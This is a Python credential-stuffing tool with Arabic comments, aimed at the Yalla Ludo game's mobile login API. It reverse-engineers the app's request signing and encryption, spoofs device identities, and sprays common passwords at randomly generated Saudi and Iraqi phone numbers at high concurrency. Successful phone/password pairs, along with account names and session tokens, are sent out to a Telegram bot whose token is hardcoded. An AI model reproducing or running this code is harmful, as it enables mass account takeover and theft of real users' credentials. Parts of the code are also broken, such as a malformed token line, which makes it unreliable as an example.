import base64, json, hashlib, time, uuid, struct, hmac as hmacmod, random, string
import asyncio, aiohttp, sys, os, threading
from collections import defaultdict
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except:
    Fore = Style = type('obj', (object,), {'GREEN': '', 'RED': '', 'YELLOW': '', 'CYAN': '', 'MAGENTA': '', 'WHITE': '', 'RESET_ALL': ''})()


version = '2.0'
b1key   = b'4e82797b276c5cb729db62aaa229a057'
b1iv    = b'0102030405060708'
secret  = 'L3)qk*@8'
api     = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
ua      = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"


kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if   i < 16: f = (b & c) | (~b & d); g = i
            elif i < 32: f = (d & b) | (~d & c); g = (5*i+1) % 16
            elif i < 48: f = b ^ c ^ d;           g = (3*i+5) % 16
            else:        f = c ^ (b | ~d);         g = (7*i)   % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d; d = c; c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0=(a0+a)&0xffffffff; b0=(b0+b)&0xffffffff
        c0=(c0+c)&0xffffffff; d0=(d0+d)&0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

# ==================== تشفير/فك الـ body (XOR بـ Hera) ====================
def encrypt(data, hera):
    k  = md5r(hera.encode() + secret.encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()

# ==================== التوقيع ====================
def sign(data, hera):
    key = md5r(hera.encode() + secret.encode()).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

# ==================== Medusa ====================
def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

# ==================== توليد الأجهزة ====================
def gendevice():
    device  = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars   = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce   = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return device, android, shumeng, nonce

# ==================== إنشاء Baggage ====================
def baggage(timestamp, country):
    device, android, shumeng, nonce = gendevice()
    obj = {
        "timeSpan": timestamp,
        "version": "1.5.1.0",
        "deviceId": device,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "LanguageId": 2,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": country,
        "X-Sim-Country": country,
        "AndroidId": android,
        "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode(), device, android, shumeng, nonce

# ==================== بناء الطلب ====================
def buildrequest(body, country):
    now    = int(time.time() * 1000)
    hera   = uuid.uuid4().hex
    bag, device, android, shumeng, nonce = baggage(str(now), country)
    endpoint = '/' + '/'.join(api.split('/')[3:])
    signed = (endpoint + '' + ua + bag).encode('utf-8')

    xsign   = f'{version}_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)

    enc_body = encrypt(body, hera)
    wire = json.dumps(
        {"paramJsonString": enc_body},
        separators=(',',':')
    ).encode('utf-8')

    headers = {
        'User-Agent': ua,
        'UserId': '0',
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': '',
        'X-Timestamp': str(now),
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': str(now),
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
    }

    return headers, wire, hera, device, android, shumeng, nonce

# ==================== بناء الـ payload (body) ====================
def payload(mobile, password_md5, country, device, android, shumeng, nonce):
    area_code = "966" if country == 'SA' else "964"
    data = {
        "mobile": mobile,
        "areaCode": area_code,
        "password": password_md5,
        "languageId": 2,
        "nationalityId": "1",
        "hostConfig": [
            {"bizType":5000,"countryCode":"IQ","hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
            {"bizType":1006,"countryCode":"IQ","hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
            {"bizType":1000,"countryCode":"IQ","hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
        ],
        "simCountry": country,
        "version": "1.5.1.0",
        "deviceId": device,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": country,
        "X-Sim-Country": country,
        "AndroidId": android,
        "IsSubpackages": 0,
        "appType": 0,
        "idfa": "",
    }
    return json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')


def decode_response(resp, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    param  = resp.get("paramJsonString", "")
    if not param:
        return resp
    raw = base64.b64decode(param)
    
    try:
        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
        return json.loads(xored.decode('utf-8'))
    except Exception:
        pass
    
    if hera:
        try:
            k  = md5r(hera.encode() + secret.encode()).encode()
            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
            dec = bytes(a ^ b for a, b in zip(raw, ks))
            return json.loads(dec.decode('utf-8'))
        except Exception:
            pass
    return resp

# ==================== كلمات المرور ====================
PASSWORDS_SA = ["Aa123456@", "Aa1234567@", "Aa1234567", "Aa@123456", "Aa@123123", "Aa@112233"]
PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]

# ==================== متغيرات البوت ====================
BOT_TOKEN = ""  # سيُطلب من المستخدم
CHAT_ID = ""    # سيُطلب من المستخدم
MAX_RESULTS = 0
COUNTRY = None

# ==================== إحصائيات ====================
stats = defaultdict(int)
stats_lock = threading.Lock()
stop_flag = False

# ==================== توليد الأرقام ====================
used_numbers = set()
used_lock = threading.Lock()

def generate_mobile(country):
    while True:
        if country == 'SA':
            prefix = "05"
            suffix = ''.join(random.choices('0123456789', k=8))
            mobile = prefix + suffix
        else:  # IQ
            second = random.choice(['75', '78', '77'])
            suffix = ''.join(random.choices('0123456789', k=8))
            mobile = "0" + second + suffix
        with used_lock:
            if mobile not in used_numbers:
                used_numbers.add(mobile)
                return mobile

# ==================== إرسال إلى تيليجرام ====================
async def send_telegram_async(session, phone, pwd, country, extra=""):
    if not BOT_TOKEN or not CHAT_ID:
        return
    flag = "🇸🇦" if country == 'SA' else "🇮🇶"
    display_phone = phone
    message = f"{flag} Phone : <code>{display_phone}</code>\n🔑 Pass   : <code>{pwd}</code>\n{extra}\n\n<a href=\"tg://resolve?domain=DD36DD\">@DD36DD</a>"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    for attempt in range(3):
        try:
            async with session.post(url, data=payload, timeout=10) as resp:
                if resp.status == 200:
                    return
        except:
            if attempt == 2:
                pass
            else:
                await asyncio.sleep(1)

# ==================== دالة فحص رقم (باستخدام اللوجن الجديد) ====================
async def check_number_async(session, mobile, semaphore, country):
    global stats, stop_flag
    async with semaphore:
        area_code = "966" if country == 'SA' else "964"
        passwords = PASSWORDS_SA if country == 'SA' else PASSWORDS_IQ

        # توليد أجهزة جديدة لكل رقم
        device, android, shumeng, nonce = gendevice()

        # تجربة كلمات المرور
        for idx, pwd in enumerate(passwords):
            if stop_flag:
                return
            pwd_md5 = md5upper(pwd)
            body = payload(mobile, pwd_md5, country, device, android, shumeng, nonce)
            headers, wire, hera, _, _, _, _ = buildrequest(body, country)

            try:
                async with session.post(api, data=wire, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status != 200:
                        with stats_lock:
                            stats['error'] += 1
                            stats['total'] += 1
                        continue
                    data = await resp.json()
                    result = decode_response(data, hera)
            except Exception:
                with stats_lock:
                    stats['error'] += 1
                    stats['total'] += 1
                continue

            status = result.get("status", -1)
            tips = result.get("tips", "")

            if status == 0:
                # نجاح
                with stats_lock:
                    stats['good'] += 1
                    stats['total'] += 1
                    if MAX_RESULTS > 0 and stats['good'] >= MAX_RESULTS:
                        stop_flag = True

                
                extra = ""
                if "data" in result:
                    d = result["data"]
                    name = d.get("name", "")
                    token = d.get("token", "")
                    if name:
                        extra += f"👤 Name: {name}\n"
                    if token:
                        extra += f"🔑 Token: {token}\n"
                await send_telegram_async(session, mobile, pwd, country, extra)
                return
            elif status == 151 or ("كلمة السر" in tips and "خاطئة" in tips):
                
                continue
            else:
                
                with stats_lock:
                    stats['not_registered'] += 1
                    stats['total'] += 1
                return  # لا داعي لتجربة باقي الكلمات
        # إذا انتهت كل الكلمات بدون نجاح
        with stats_lock:
            stats['wrong_pass'] += 1
            stats['total'] += 1

# ==================== لوحة الإحصائيات ====================
def dashboard_loop():
    while not stop_flag:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = r"""
███████╗██╗   ██╗██████╗ ███████╗██████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
███████╗ ╚████╔╝ ██████╔╝█████╗  ██████╔╝
╚════██║  ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
███████║   ██║   ██████╔╝███████╗██║  ██║
╚══════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        print(Fore.CYAN + banner + Style.RESET_ALL)
        print("\n" + Fore.MAGENTA + "────────────────────────────────────────────────────────────" + Style.RESET_ALL + "\n")
        with stats_lock:
            total = stats['total']
            good = stats['good']
            wrong = stats['wrong_pass']
            notreg = stats['not_registered']
            errors = stats['error']
        print(f"  {Fore.CYAN}الإجمالي: {total}{Style.RESET_ALL} | "
              f"{Fore.GREEN}Good: {good}{Style.RESET_ALL} | "
              f"{Fore.YELLOW}Wrong Pass: {wrong}{Style.RESET_ALL} | "
              f"{Fore.RED}Not Reg: {notreg}{Style.RESET_ALL} | "
              f"{Fore.WHITE}Errors: {errors}{Style.RESET_ALL}")
        time.sleep(0.5)


async def main_async():
    global stop_flag, BOT_TOKEN, CHAT_ID, MAX_RESULTS, COUNTRY

    expiry = datetime(2027, 9, 6)
    if datetime.now() > expiry:
        print(Fore.RED + "❌ انتهت صلاحية البوت (تاريخ 2026/9/7)." + Style.RESET_ALL)
        return

 
    BOT_TOKEN = ""5238280494:AAFum7RNvraR-3g4L0RC9pKuJRiKnabA-Fw"
    if not BOT_TOKEN:
        print(Fore.RED + "❌ التوكن مطلوب." + Style.RESET_ALL)
        return

    print(Fore.CYAN + "اختر البلد:")
    print("1. 🇸🇦 سعودي")
    print("2. 🇮🇶 عراقي")
    choice = "2"
    if choice == '1':
        COUNTRY = 'SA'
    elif choice == '2':
        COUNTRY = 'IQ'
    else:
        print(Fore.RED + "اختيار غير صحيح." + Style.RESET_ALL)
        return

    CHAT_ID = input("ادخل ايدي تلجرام (رقم المجموعة أو المعرف): ").strip()
    if not CHAT_ID:
        print(Fore.RED + "❌ المعرف مطلوب." + Style.RESET_ALL)
        return

    try:
        MAX_RESULTS = int(input("أدخل عدد النتائج الجيدة المطلوبة (0 = غير محدود): ") or "0")
    except:
        MAX_RESULTS = 0

    concurrency = 200

    semaphore = asyncio.Semaphore(concurrency)

    threading.Thread(target=dashboard_loop, daemon=True).start()

    connector = aiohttp.TCPConnector(limit=concurrency*2, limit_per_host=concurrency, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        while not stop_flag:
            mobile = generate_mobile(COUNTRY)
            task = asyncio.create_task(check_number_async(session, mobile, semaphore, COUNTRY))
            tasks.append(task)
            if len(tasks) > 2000:
                done, pending = await asyncio.wait(tasks[:500], return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending) + tasks[500:]
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

def run():
    asyncio.run(main_async())

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print("\nتم الإيقاف.")